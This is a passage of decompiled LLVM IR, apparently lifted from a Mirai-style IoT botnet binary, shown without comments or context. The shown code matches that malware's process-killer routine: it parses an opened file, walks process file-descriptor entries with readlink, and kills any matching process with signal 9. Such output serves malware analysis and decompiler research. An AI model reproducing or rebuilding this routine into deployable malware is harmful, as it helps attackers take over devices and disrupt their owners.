  br i1 %v2_cab0, label %dec_label_pc_cabc, label %bb127

bb127:                                            ; preds = %dec_label_pc_caa8
  %v8_cab4 = icmp eq i8 %v4_caac, 58
  br i1 %v8_cab4, label %dec_label_pc_cabc, label %dec_label_pc_caa8

dec_label_pc_cabc:                                ; preds = %dec_label_pc_caa8, %bb127, %bb126, %.thread8
  %v1_cae8 = phi i32 [ 0, %.thread8 ], [ 0, %bb126 ], [ %v1_caa8, %bb127 ], [ %v1_caa8, %dec_label_pc_caa8 ]
  %v0_cabc = phi i32 [ %v4_ca88, %.thread8 ], [ %v4_ca88, %bb126 ], [ %v6_caac, %bb127 ], [ %v6_caac, %dec_label_pc_caa8 ]
  %v2_cabc = icmp eq i32 %v0_cabc, 0
  br i1 %v2_cabc, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cac4

dec_label_pc_ca6c.backedge:                       ; preds = %dec_label_pc_cabc, %dec_label_pc_cb8c, %dec_label_pc_cbd8, %dec_label_pc_cb08
  %v0_ca74 = load i32, i32* @r8, align 4
  %v4_ca78 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v0_ca74)
  %v2_ca7c = icmp eq i32 %v4_ca78, 0
  br i1 %v2_ca7c, label %dec_label_pc_cc04.loopexit, label %dec_label_pc_ca84

dec_label_pc_cac4:                                ; preds = %dec_label_pc_cabc
  %v1_cac8 = add i32 %v1_cae8, 2
  %v2_cad0 = add i32 %v1_cac8, %v2_cacc
  %v1_cad4 = add i32 %v2_cad0, -545
  %v2_cad4 = inttoptr i32 %v1_cad4 to i8*
  %v3_cad4 = load i8, i8* %v2_cad4, align 1
  %v2_cad8 = icmp eq i8 %v3_cad4, 0
  br i1 %v2_cad8, label %bb129, label %bb128

bb128:                                            ; preds = %dec_label_pc_cac4
  %v8_cadc = icmp eq i8 %v3_cad4, 32
  br i1 %v8_cadc, label %.thread13, label %dec_label_pc_cae8

.thread13:                                        ; preds = %bb128
  store i32 %v1_cac8, i32* @r5, align 4
  br label %dec_label_pc_cb08

bb129:                                            ; preds = %dec_label_pc_cac4
  store i32 %v1_cac8, i32* @r5, align 4
  br label %dec_label_pc_cb08

dec_label_pc_cae8:                                ; preds = %bb128
  %v0_cae8 = load i32, i32* @r6, align 4
  %v2_cae8 = add i32 %v0_cae8, %v1_cae8
  br label %dec_label_pc_caf0

dec_label_pc_caf0:                                ; preds = %bb130, %dec_label_pc_cae8
  %v0_cafc16 = phi i32 [ %v1_cafc, %bb130 ], [ %v1_cac8, %dec_label_pc_cae8 ]
  %v0_cb0018 = phi i32 [ %v1_cb00, %bb130 ], [ %v2_cae8, %dec_label_pc_cae8 ]
  %v1_caf0 = add i32 %v0_cb0018, 3
  %v2_caf0 = inttoptr i32 %v1_caf0 to i8*
  %v3_caf0 = load i8, i8* %v2_caf0, align 1
  %v2_caf4 = icmp eq i8 %v3_caf0, 0
  br i1 %v2_caf4, label %.thread15, label %bb130

.thread15:                                        ; preds = %dec_label_pc_caf0
  %v1_cafc17 = add i32 %v0_cafc16, 1
  store i32 %v1_cafc17, i32* @r5, align 4
  br label %dec_label_pc_cb08

bb130:                                            ; preds = %dec_label_pc_caf0
  %v8_caf8 = icmp eq i8 %v3_caf0, 32
  %v1_cafc = add i32 %v0_cafc16, 1
  store i32 %v1_cafc, i32* @r5, align 4
  %v1_cb00 = add i32 %v0_cb0018, 1
  br i1 %v8_caf8, label %dec_label_pc_cb08, label %dec_label_pc_caf0

dec_label_pc_cb08:                                ; preds = %bb130, %bb129, %.thread15, %.thread13
  %v1_cb14 = phi i32 [ %v1_cafc17, %.thread15 ], [ %v1_cac8, %.thread13 ], [ %v1_cac8, %bb129 ], [ %v1_cafc, %bb130 ]
  %v0_cb08 = load i32, i32* @r6, align 4
  %v2_cb08 = add i32 %v0_cb08, %v1_cac8
  store i32 %v2_cb08, i32* @r4, align 4
  %v2_cb14 = add i32 %v1_cb14, %v2_cacc
  store i32 0, i32* @r7, align 4
  %v3_cb1c = add i32 %v2_cb14, -545
  %v4_cb1c = inttoptr i32 %v3_cb1c to i8*
  store i8 0, i8* %v4_cb1c, align 1
  %v0_cb20 = load i32, i32* @r4, align 4
  %v1_cb24 = inttoptr i32 %v0_cb20 to i8*
  %v2_cb24 = call i32 @util_strlen(i8* %v1_cb24)
  store i32 %v2_cb24, i32* @r1, align 4
  %v0_cb30 = load i32, i32* @r4, align 4
  %v3_cb34 = inttoptr i32 %v0_cb30 to i8*
  %v4_cb34 = call i32 @util_stristr(i8* %v3_cb34, i32 %v2_cb24, i32 %v2_c9fc)
  %v7_cb38 = icmp eq i32 %v4_cb34, -1
  br i1 %v7_cb38, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cb54.preheader

dec_label_pc_cb54.preheader:                      ; preds = %dec_label_pc_cb08
  %v1_cb3c = load i32, i32* @r7, align 4
  %v1_cb40 = load i32, i32* @r6, align 4
  %v2_cb40 = load i32, i32* @r5, align 4
  %v3_cb40 = add i32 %v2_cb40, %v1_cb40
  store i32 %v1_cb3c, i32* @lr, align 4
  %v1_cb5448 = add i32 %v3_cb40, 2
  %v2_cb5449 = inttoptr i32 %v1_cb5448 to i8*
  %v3_cb5450 = load i8, i8* %v2_cb5449, align 1
  %v4_cb5451 = zext i8 %v3_cb5450 to i32
  store i32 %v4_cb5451, i32* @r3, align 4
  %v2_cb5852 = icmp eq i8 %v3_cb5450, 0
  %v1_cb5c54 = add i32 %v2_cb40, 2
  br i1 %v2_cb5852, label %dec_label_pc_cb8c, label %dec_label_pc_cb64

dec_label_pc_cb64:                                ; preds = %dec_label_pc_cb54.preheader, %dec_label_pc_cb54.backedge
  %v0_cb8c83 = phi i32 [ %v0_cb8c81, %dec_label_pc_cb54.backedge ], [ %v1_cb3c, %dec_label_pc_cb54.preheader ]
  %v0_cb74.pr = phi i32 [ %v0_cb74.pr70, %dec_label_pc_cb54.backedge ], [ %v1_cb3c, %dec_label_pc_cb54.preheader ]
  %v0_ce94 = phi i32 [ %v0_ce9473, %dec_label_pc_cb54.backedge ], [ %v1_cb3c, %dec_label_pc_cb54.preheader ]
  %v0_cb5c78 = phi i32 [ %v1_cb5c, %dec_label_pc_cb54.backedge ], [ %v1_cb5c54, %dec_label_pc_cb54.preheader ]
  %v0_cb84 = phi i32 [ %v0_cb54, %dec_label_pc_cb54.backedge ], [ %v3_cb40, %dec_label_pc_cb54.preheader ]
  %v1_cb68 = phi i32 [ %v4_cb54, %dec_label_pc_cb54.backedge ], [ %v4_cb5451, %dec_label_pc_cb54.preheader ]
  %v7_cb64 = icmp eq i32 %v1_cb68, 9
  br i1 %v7_cb64, label %bb132, label %bb131

bb131:                                            ; preds = %dec_label_pc_cb64
  %v8_cb68 = icmp eq i32 %v1_cb68, 32
  br i1 %v8_cb68, label %.thread27, label %dec_label_pc_cb74

.thread27:                                        ; preds = %bb131
  br label %dec_label_pc_cb80

bb132:                                            ; preds = %dec_label_pc_cb64
  br label %dec_label_pc_cb80

dec_label_pc_cb74:                                ; preds = %bb131
  %v7_cb74 = icmp eq i32 %v0_cb74.pr, 1
  br i1 %v7_cb74, label %dec_label_pc_ce94, label %dec_label_pc_cb7c

dec_label_pc_cb7c:                                ; preds = %dec_label_pc_ce94, %dec_label_pc_cb74
  %v0_cb8075 = phi i32 [ %v1_ce94, %dec_label_pc_ce94 ], [ %v0_ce94, %dec_label_pc_cb74 ]
  br label %dec_label_pc_cb80

dec_label_pc_cb80:                                ; preds = %bb132, %.thread27, %dec_label_pc_cb7c
  %v0_cb80 = phi i32 [ %v0_ce94, %.thread27 ], [ %v0_ce94, %bb132 ], [ %v0_cb8075, %dec_label_pc_cb7c ]
  %v0_cb74.pr71 = phi i32 [ 1, %.thread27 ], [ 1, %bb132 ], [ 0, %dec_label_pc_cb7c ]
  %v7_cb88 = icmp sgt i32 %v0_cb80, 6
  br i1 %v7_cb88, label %dec_label_pc_cb8c, label %dec_label_pc_cb54.backedge

dec_label_pc_cb8c:                                ; preds = %dec_label_pc_cb54.backedge, %dec_label_pc_cb80, %dec_label_pc_cb54.preheader
  %v1_cbdc = phi i32 [ %v1_cb5c54, %dec_label_pc_cb54.preheader ], [ %v1_cb5c, %dec_label_pc_cb54.backedge ], [ %v0_cb5c78, %dec_label_pc_cb80 ]
  %v0_cb8c = phi i32 [ %v1_cb3c, %dec_label_pc_cb54.preheader ], [ %v0_cb8c81, %dec_label_pc_cb54.backedge ], [ %v0_cb8c83, %dec_label_pc_cb80 ]
  %v2_cb8c = icmp eq i32 %v0_cb8c, 0
  br i1 %v2_cb8c, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cb98

dec_label_pc_cb98:                                ; preds = %dec_label_pc_cb8c
  %v2_cba0 = add i32 %v1_cbdc, %v2_cacc
  %v1_cba4 = add i32 %v2_cba0, -545
  %v2_cba4 = inttoptr i32 %v1_cba4 to i8*
  %v3_cba4 = load i8, i8* %v2_cba4, align 1
  %v2_cba8 = icmp eq i8 %v3_cba4, 0
  br i1 %v2_cba8, label %dec_label_pc_cbd8, label %bb133

bb133:                                            ; preds = %dec_label_pc_cb98
  %v8_cbac = icmp eq i8 %v3_cba4, 32
  br i1 %v8_cbac, label %dec_label_pc_cbd8, label %dec_label_pc_cbb4

dec_label_pc_cbb4:                                ; preds = %bb133
  %v2_cbb4 = add i32 %v1_cbdc, %v1_cb40
  br label %dec_label_pc_cbb8

dec_label_pc_cbb8:                                ; preds = %bb134, %dec_label_pc_cbb4
  %v0_cbc430 = phi i32 [ %v1_cbc4, %bb134 ], [ %v1_cbdc, %dec_label_pc_cbb4 ]
  %v0_cbb8 = phi i32 [ %v1_cbb8, %bb134 ], [ %v2_cbb4, %dec_label_pc_cbb4 ]
  %v1_cbb8 = add i32 %v0_cbb8, 1
  %v2_cbb8 = inttoptr i32 %v1_cbb8 to i8*
  %v3_cbb8 = load i8, i8* %v2_cbb8, align 1
  %v2_cbbc = icmp eq i8 %v3_cbb8, 0
  br i1 %v2_cbbc, label %.thread29, label %bb134

.thread29:                                        ; preds = %dec_label_pc_cbb8
  %v1_cbc431 = add i32 %v0_cbc430, 1
  br label %dec_label_pc_cbcc

bb134:                                            ; preds = %dec_label_pc_cbb8
  %v8_cbc0 = icmp eq i8 %v3_cbb8, 32
  %v1_cbc4 = add i32 %v0_cbc430, 1
  br i1 %v8_cbc0, label %dec_label_pc_cbcc, label %dec_label_pc_cbb8

dec_label_pc_cbcc:                                ; preds = %bb134, %.thread29
  %v1_cbd4 = phi i32 [ %v1_cbc431, %.thread29 ], [ %v1_cbc4, %bb134 ]
  %v2_cbd4 = add i32 %v1_cbd4, %v2_cacc
  br label %dec_label_pc_cbd8

dec_label_pc_cbd8:                                ; preds = %dec_label_pc_cb98, %bb133, %dec_label_pc_cbcc
  %v2_cbe4 = phi i32 [ %v2_cba0, %dec_label_pc_cb98 ], [ %v2_cba0, %bb133 ], [ %v2_cbd4, %dec_label_pc_cbcc ]
  %v2_cbdc = add i32 %v1_cbdc, %v1_cb40
  store i32 %v2_cbdc, i32* @r4, align 4
  %v3_cbe4 = add i32 %v2_cbe4, -545
  %v4_cbe4 = inttoptr i32 %v3_cbe4 to i8*
  store i8 0, i8* %v4_cbe4, align 1
  %v1_cbe8 = inttoptr i32 %v2_cbdc to i8*
  %v2_cbe8 = call i32 @util_strlen(i8* %v1_cbe8)
  %v8_cbf0 = icmp sgt i32 %v2_cbe8, 15
  br i1 %v8_cbf0, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cbf4

dec_label_pc_cbf4:                                ; preds = %dec_label_pc_cbd8
  %v0_cbf8 = load i32, i32* @r4, align 4
  %v2_cbfc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_cbfc, i32* @r0, align 4
  %v2_cc00 = bitcast i32* %stack_var_-56 to i8*
  %v3_cc00 = call i32 @util_strcpy(i8* %v2_cc00, i32 %v0_cbf8)
  br label %dec_label_pc_cc04

dec_label_pc_cc04.loopexit:                       ; preds = %dec_label_pc_ca6c.backedge, %dec_label_pc_ca6c.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre92 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_cc04

dec_label_pc_cc04:                                ; preds = %dec_label_pc_cc04.loopexit, %dec_label_pc_cbf4
  %v1_cc14.pre-phi = phi i8* [ %.pre92, %dec_label_pc_cc04.loopexit ], [ %v2_cc00, %dec_label_pc_cbf4 ]
  %v2_cc10.pre-phi = phi i32 [ %.pre, %dec_label_pc_cc04.loopexit ], [ %v2_cbfc, %dec_label_pc_cbf4 ]
  %v0_cc04 = load i32, i32* @r8, align 4
  %v1_cc08 = call i32 @__GI___libc_close(i32 %v0_cc04)
  %v2_cc14 = call i32 @util_strlen(i8* %v1_cc14.pre-phi)
  store i32 %v2_cc14, i32* @r4, align 4
  %v2_cc18 = icmp eq i32 %v2_cc14, 0
  br i1 %v2_cc18, label %dec_label_pc_cec0, label %dec_label_pc_cc20

dec_label_pc_cc20:                                ; preds = %dec_label_pc_cc04
  %v3_cc28 = call i32 @table_retrieve_val(i32 13, i32* null)
  %v1_cc2c = call i32 @__GI_opendir(i32 %v3_cc28)
  store i32 %v1_cc2c, i32* @sb, align 4
  %v2_cc30 = icmp eq i32 %v1_cc2c, 0
  br i1 %v2_cc30, label %dec_label_pc_ce60, label %dec_label_pc_cc40.preheader

dec_label_pc_cc40.preheader:                      ; preds = %dec_label_pc_cc20
  store i32 0, i32* @r5, align 4
  %v1_cc4443 = inttoptr i32 %v1_cc2c to i32*
  %v2_cc4444 = call i32 @__GI_readdir(i32* %v1_cc4443)
  %v2_cc4846 = icmp eq i32 %v2_cc4444, 0
  br i1 %v2_cc4846, label %dec_label_pc_ce54, label %dec_label_pc_cc50.preheader

dec_label_pc_cc40.loopexit:                       ; preds = %dec_label_pc_cc58, %dec_label_pc_cc68, %dec_label_pc_ccd4
  %v0_cc40 = load i32, i32* @sb, align 4
  %v1_cc44 = inttoptr i32 %v0_cc40 to i32*
  %v2_cc44 = call i32 @__GI_readdir(i32* %v1_cc44)
  %v2_cc48 = icmp eq i32 %v2_cc44, 0
  br i1 %v2_cc48, label %dec_label_pc_ce54, label %dec_label_pc_cc50.preheader

dec_label_pc_cc50.preheader:                      ; preds = %dec_label_pc_cc40.preheader, %dec_label_pc_cc40.loopexit
  %v0_cc5891 = phi i32 [ %v2_cc44, %dec_label_pc_cc40.loopexit ], [ %v2_cc4444, %dec_label_pc_cc40.preheader ]
  br label %dec_label_pc_cc50

dec_label_pc_cc50:                                ; preds = %dec_label_pc_cc50.preheader, %dec_label_pc_ce3c
  %v0_cc70 = phi i32 [ %v0_cc5891, %dec_label_pc_cc50.preheader ], [ %v2_ce48, %dec_label_pc_ce3c ]
  %v0_cc50 = load i32, i32* @r5, align 4
  %v2_cc50 = icmp eq i32 %v0_cc50, 0
  br i1 %v2_cc50, label %dec_label_pc_cc58, label %dec_label_pc_ce54

dec_label_pc_cc58:                                ; preds = %dec_label_pc_cc50
  %v1_cc58 = add i32 %v0_cc70, 11
  %v2_cc58 = inttoptr i32 %v1_cc58 to i8*
  %v3_cc58 = load i8, i8* %v2_cc58, align 1
  %v4_cc58 = zext i8 %v3_cc58 to i32
  %v1_cc5c = add nsw i32 %v4_cc58, -48
  %tmp = icmp ugt i32 %v1_cc5c, 9
  br i1 %tmp, label %dec_label_pc_cc40.loopexit, label %dec_label_pc_cc68

dec_label_pc_cc68:                                ; preds = %dec_label_pc_cc58
  store i32 %v1_cc58, i32* @r7, align 4
  %v3_cc74 = call i32 @table_retrieve_val(i32 13, i32* null)
  store i32 %v2_c9d4, i32* @r0, align 4
  %v3_cc80 = call i32 @util_strcpy(i8* %v3_c9f8, i32 %v3_cc74)
  %v2_cc88 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cc8c = load i32, i32* @r7, align 4
  %v1_cc90 = load i32, i32* @sl, align 4
  %v2_cc90 = add i32 %v1_cc90, %v2_cc88
  store i32 %v2_cc90, i32* @r0, align 4
  %v2_cc94 = inttoptr i32 %v2_cc90 to i8*
  %v3_cc94 = call i32 @util_strcpy(i8* %v2_cc94, i32 %v0_cc8c)
  %v2_cc9c = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cca0 = load i32, i32* @r5, align 4
  store i32 %v2_cc9c, i32* @r4, align 4
  %v2_ccac = inttoptr i32 %v0_cca0 to i32*
  %v3_ccac = call i32 @table_retrieve_val(i32 14, i32* %v2_ccac)
  %v0_ccb4 = load i32, i32* @r4, align 4
  %v1_ccb4 = load i32, i32* @sl, align 4
  %v2_ccb4 = add i32 %v1_ccb4, %v0_ccb4
  store i32 %v2_ccb4, i32* @r0, align 4
  %v2_ccb8 = inttoptr i32 %v2_ccb4 to i8*
  %v3_ccb8 = call i32 @util_strcpy(i8* %v2_ccb8, i32 %v3_ccac)
  %v3_ccc8 = call i32 @readlink(i32 %v2_c9d4, i32 %v2_c9c4, i32 4096)
  %v7_cccc = icmp eq i32 %v3_ccc8, -1
  br i1 %v7_cccc, label %dec_label_pc_cc40.loopexit, label %dec_label_pc_ccd4

dec_label_pc_ccd4:                                ; preds = %dec_label_pc_cc68
  %v0_ccd4 = load i32, i32* @r5, align 4
  %v2_ccdc = inttoptr i32 %v0_ccd4 to i32*
  %v3_ccdc = call i32 @table_retrieve_val(i32 13, i32* %v2_ccdc)
  store i32 %v2_c9d4, i32* @r0, align 4
  %v3_cce8 = call i32 @util_strcpy(i8* %v3_c9f8, i32 %v3_ccdc)
  %v2_ccf0 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_ccf4 = load i32, i32* @r7, align 4
  %v1_ccf8 = load i32, i32* @sl, align 4
  %v2_ccf8 = add i32 %v1_ccf8, %v2_ccf0
  store i32 %v2_ccf8, i32* @r0, align 4
  %v2_ccfc = inttoptr i32 %v2_ccf8 to i8*
  %v3_ccfc = call i32 @util_strcpy(i8* %v2_ccfc, i32 %v0_ccf4)
  %v2_cd04 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cd08 = load i32, i32* @r5, align 4
  store i32 %v2_cd04, i32* @r4, align 4
  %v2_cd14 = inttoptr i32 %v0_cd08 to i32*
  %v3_cd14 = call i32 @table_retrieve_val(i32 15, i32* %v2_cd14)
  %v0_cd1c = load i32, i32* @r4, align 4
  %v1_cd1c = load i32, i32* @sl, align 4
  %v2_cd1c = add i32 %v1_cd1c, %v0_cd1c
  store i32 %v2_cd1c, i32* @r0, align 4
  %v2_cd20 = inttoptr i32 %v2_cd1c to i8*
  %v3_cd20 = call i32 @util_strcpy(i8* %v2_cd20, i32 %v3_cd14)
  %v1_cd28 = call i32 @__GI_opendir(i32 %v2_c9d4)
  store i32 %v1_cd28, i32* @r8, align 4
  %v2_cd2c = icmp eq i32 %v1_cd28, 0
  br i1 %v2_cd2c, label %dec_label_pc_cc40.loopexit, label %dec_label_pc_cd34.preheader

dec_label_pc_cd34.preheader:                      ; preds = %dec_label_pc_ccd4
  %v1_cd3838 = inttoptr i32 %v1_cd28 to i32*
  %v2_cd3839 = call i32 @__GI_readdir(i32* %v1_cd3838)
  store i32 %v2_cd3839, i32* @r6, align 4
  %v2_cd3c41 = icmp eq i32 %v2_cd3839, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9c4, i32* @r0, align 4
  br i1 %v2_cd3c41, label %dec_label_pc_ce3c, label %dec_label_pc_cd4cthread-pre-split

dec_label_pc_cd34.loopexit:                       ; preds = %dec_label_pc_cd54, %dec_label_pc_cdec
  %v0_cd34 = load i32, i32* @r8, align 4
  %v1_cd38 = inttoptr i32 %v0_cd34 to i32*
  %v2_cd38 = call i32 @__GI_readdir(i32* %v1_cd38)
  store i32 %v2_cd38, i32* @r6, align 4
  %v2_cd3c = icmp eq i32 %v2_cd38, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9c4, i32* @r0, align 4
  br i1 %v2_cd3c, label %dec_label_pc_ce3c, label %dec_label_pc_cd4cthread-pre-split

dec_label_pc_cd4cthread-pre-split:                ; preds = %dec_label_pc_cd34.preheader, %dec_label_pc_cd34.loopexit
  %v0_cd4c.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_cd4c

dec_label_pc_cd4c:                                ; preds = %dec_label_pc_cd4cthread-pre-split, %dec_label_pc_ce14
  %v0_cd4c = phi i32 [ %v0_cd4c.pr, %dec_label_pc_cd4cthread-pre-split ], [ 1, %dec_label_pc_ce14 ]
  %v2_cd4c = icmp eq i32 %v0_cd4c, 0
  br i1 %v2_cd4c, label %dec_label_pc_cd54, label %dec_label_pc_ce3c

dec_label_pc_cd54:                                ; preds = %dec_label_pc_cd4c
  %v0_cd54 = call i32 @util_zero()
  %v0_cd58 = load i32, i32* @r5, align 4
  %v2_cd60 = inttoptr i32 %v0_cd58 to i32*
  %v3_cd60 = call i32 @table_retrieve_val(i32 13, i32* %v2_cd60)
  store i32 %v2_c9d4, i32* @r0, align 4
  %v3_cd6c = call i32 @util_strcpy(i8* %v3_c9f8, i32 %v3_cd60)
  %v2_cd74 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cd78 = load i32, i32* @r7, align 4
  %v1_cd7c = load i32, i32* @sl, align 4
  %v2_cd7c = add i32 %v1_cd7c, %v2_cd74
  store i32 %v2_cd7c, i32* @r0, align 4
  %v2_cd80 = inttoptr i32 %v2_cd7c to i8*
  %v3_cd80 = call i32 @util_strcpy(i8* %v2_cd80, i32 %v0_cd78)
  %v2_cd88 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cd8c = load i32, i32* @r5, align 4
  store i32 %v2_cd88, i32* @r4, align 4
  %v2_cd98 = inttoptr i32 %v0_cd8c to i32*
  %v3_cd98 = call i32 @table_retrieve_val(i32 15, i32* %v2_cd98)
  %v0_cda0 = load i32, i32* @r4, align 4
  %v1_cda0 = load i32, i32* @sl, align 4
  %v2_cda0 = add i32 %v1_cda0, %v0_cda0
  store i32 %v2_cda0, i32* @r0, align 4
  %v2_cda4 = inttoptr i32 %v2_cda0 to i8*
  %v3_cda4 = call i32 @util_strcpy(i8* %v2_cda4, i32 %v3_cd98)
  %v2_cdac = call i32 @util_strlen(i8* %v3_c9f8)
  %v1_cdb4 = load i32, i32* @sl, align 4
  %v2_cdb4 = add i32 %v1_cdb4, %v2_cdac
  store i32 %v2_cdb4, i32* @r0, align 4
  %v2_cdb8 = inttoptr i32 %v2_cdb4 to i8*
  %v3_cdb8 = call i32 @util_strcpy(i8* %v2_cdb8, i32 ptrtoint (i32* @global_var_18f48.69 to i32))
  %v2_cdc0 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cdc4 = load i32, i32* @r6, align 4
  %v1_cdc4 = add i32 %v0_cdc4, 11
  %v1_cdc8 = load i32, i32* @sl, align 4
  %v2_cdc8 = add i32 %v1_cdc8, %v2_cdc0
  store i32 %v2_cdc8, i32* @r0, align 4
  %v2_cdcc = inttoptr i32 %v2_cdc8 to i8*
  %v3_cdcc = call i32 @util_strcpy(i8* %v2_cdcc, i32 %v1_cdc4)
  %v3_cddc = call i32 @readlink(i32 %v2_c9d4, i32 %v2_c9c4, i32 4096)
  %v7_cde0 = icmp eq i32 %v3_cddc, -1
  br i1 %v7_cde0, label %dec_label_pc_cd34.loopexit, label %dec_label_pc_cdec

dec_label_pc_cdec:                                ; preds = %dec_label_pc_cd54
  %v2_cdec = call i32 @util_strlen(i8* %v3_c9e4)
  store i32 %v2_cdec, i32* @r1, align 4
  %v4_ce00 = call i32 @util_stristr(i8* %v3_c9e4, i32 %v2_cdec, i32 %v2_cc10.pre-phi)
  %v7_ce04 = icmp eq i32 %v4_ce00, -1
  br i1 %v7_ce04, label %dec_label_pc_cd34.loopexit, label %dec_label_pc_ce14

dec_label_pc_ce14:                                ; preds = %dec_label_pc_cdec
  %v0_ce0c = load i32, i32* @r7, align 4
  %v2_ce14 = inttoptr i32 %v0_ce0c to i8*
  %v3_ce14 = call i32 @util_atoi(i8* %v2_ce14, i32 10)
  %v2_ce1c = call i32 @kill(i32 %v3_ce14, i32 9)
  %v0_ce20 = load i32, i32* @r8, align 4
  %v1_ce24 = inttoptr i32 %v0_ce20 to i32*
  %v2_ce24 = call i32 @__GI_readdir(i32* %v1_ce24)
  store i32 %v2_ce24, i32* @r6, align 4
  %v2_ce28 = icmp eq i32 %v2_ce24, 0
  store i32 1, i32* @r5, align 4
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9c4, i32* @r0, align 4
  br i1 %v2_ce28, label %dec_label_pc_ce3c, label %dec_label_pc_cd4c

dec_label_pc_ce3c:                                ; preds = %dec_label_pc_cd34.loopexit, %dec_label_pc_ce14, %dec_label_pc_cd4c, %dec_label_pc_cd34.preheader
  %v0_ce3c = load i32, i32* @r8, align 4
  %v1_ce40 = inttoptr i32 %v0_ce3c to i32*
  %v2_ce40 = call i32 @__GI_closedir(i32* %v1_ce40)
  %v0_ce44 = load i32, i32* @sb, align 4
  %v1_ce48 = inttoptr i32 %v0_ce44 to i32*
  %v2_ce48 = call i32 @__GI_readdir(i32* %v1_ce48)
  %v2_ce4c = icmp eq i32 %v2_ce48, 0
  br i1 %v2_ce4c, label %dec_label_pc_ce54, label %dec_label_pc_cc50

dec_label_pc_ce54:                                ; preds = %dec_label_pc_cc40.loopexit, %dec_label_pc_ce3c, %dec_label_pc_cc50, %dec_label_pc_cc40.preheader
  %v0_ce54 = load i32, i32* @sb, align 4
  %v1_ce58 = inttoptr i32 %v0_ce54 to i32*
  %v2_ce58 = call i32 @__GI_closedir(i32* %v1_ce58)
  %v0_ce5c = load i32, i32* @r5, align 4
  %v1_ce5c = urem i32 %v0_ce5c, 256
  br label %dec_label_pc_ce60

dec_label_pc_ce60:                                ; preds = %dec_label_pc_cc20, %dec_label_pc_ce54
  %storemerge = phi i32 [ %v1_ce5c, %dec_label_pc_ce54 ], [ 0, %dec_label_pc_cc20 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_ce64 = call i32 @sleep(i32 1)
  %v1_ce6c = call i32 @table_lock_val(i32 13)
  %v1_ce74 = call i32 @table_lock_val(i32 14)
  %v1_ce7c = call i32 @table_lock_val(i32 15)
  br label %dec_label_pc_ce80

dec_label_pc_ce80:                                ; preds = %bb, %dec_label_pc_cec0, %dec_label_pc_ce60
  %v0_ce80 = load i32, i32* @r4, align 4
  store i32 %v3_c97c, i32* @r4, align 4
  store i32 %v6_c97c, i32* @r5, align 4
  store i32 %v9_c97c, i32* @r6, align 4
  store i32 %v12_c97c, i32* @r7, align 4
  store i32 %v15_c97c, i32* @r8, align 4
  store i32 %v18_c97c, i32* @sb, align 4
  store i32 %v21_c97c, i32* @sl, align 4
  store i32 %v24_c97c, i32* @fp, align 4
  store i32 %v27_c97c, i32* @lr, align 4
  ret i32 %v0_ce80

dec_label_pc_ce94:                                ; preds = %dec_label_pc_cb74
  %v1_ce94 = add i32 %v0_ce94, 1
  %v7_ce98 = icmp eq i32 %v0_ce94, 0
  br i1 %v7_ce98, label %dec_label_pc_cea0, label %dec_label_pc_cb7c

dec_label_pc_cea0:                                ; preds = %dec_label_pc_ce94
  %v1_cea0 = add i32 %v0_cb84, 3
  %v2_cea0 = inttoptr i32 %v1_cea0 to i8*
  %v3_cea0 = load i8, i8* %v2_cea0, align 1
  %v7_cea4 = icmp eq i8 %v3_cea0, 65
  br i1 %v7_cea4, label %dec_label_pc_ceb8, label %dec_label_pc_ceac

dec_label_pc_ceac:                                ; preds = %dec_label_pc_cea0, %dec_label_pc_ceb8
  %v0_cb8c82 = phi i32 [ %v0_cb8c83, %dec_label_pc_cea0 ], [ 1, %dec_label_pc_ceb8 ]
  br label %dec_label_pc_cb54.backedge

dec_label_pc_cb54.backedge:                       ; preds = %dec_label_pc_ceac, %dec_label_pc_cb80
  %v0_cb8c81 = phi i32 [ %v0_cb8c82, %dec_label_pc_ceac ], [ %v0_cb8c83, %dec_label_pc_cb80 ]
  %v0_ce9473 = phi i32 [ %v1_ce94, %dec_label_pc_ceac ], [ %v0_cb80, %dec_label_pc_cb80 ]
  %v0_cb74.pr70 = phi i32 [ 0, %dec_label_pc_ceac ], [ %v0_cb74.pr71, %dec_label_pc_cb80 ]
  %v0_cb54 = add i32 %v0_cb84, 1
  %v1_cb54 = add i32 %v0_cb84, 3
  %v2_cb54 = inttoptr i32 %v1_cb54 to i8*
  %v3_cb54 = load i8, i8* %v2_cb54, align 1
  %v4_cb54 = zext i8 %v3_cb54 to i32
  store i32 %v4_cb54, i32* @r3, align 4
  %v2_cb58 = icmp eq i8 %v3_cb54, 0
  %v1_cb5c = add i32 %v0_cb5c78, 1
  br i1 %v2_cb58, label %dec_label_pc_cb8c, label %dec_label_pc_cb64

dec_label_pc_ceb8:                                ; preds = %dec_label_pc_cea0
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_ceac

dec_label_pc_cec0:                                ; preds = %dec_label_pc_cc04
  %v1_cec4 = call i32 @table_lock_val(i32 13)
  %v1_cecc = call i32 @table_lock_val(i32 14)
  %v1_ced4 = call i32 @table_lock_val(i32 15)
  %v1_cedc = call i32 @table_lock_val(i32 17)
  br label %dec_label_pc_ce80

dec_label_pc_cee4:                                ; preds = %entry
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_ca28

; uselistorder directives
  uselistorder i32 %v1_cb5c, { 1, 0 }
  uselistorder i32 %v4_cb54, { 1, 0 }
  uselistorder i32 %v0_cb8c81, { 1, 0 }
  uselistorder i32 %v1_ce94, { 1, 0 }
  uselistorder i32 %v2_ce48, { 1, 0 }
  uselistorder i32 %v1_cbb8, { 1, 0 }
  uselistorder i32 %v0_cbc430, { 1, 0 }
  uselistorder i32 %v1_cbdc, { 0, 3, 1, 2 }
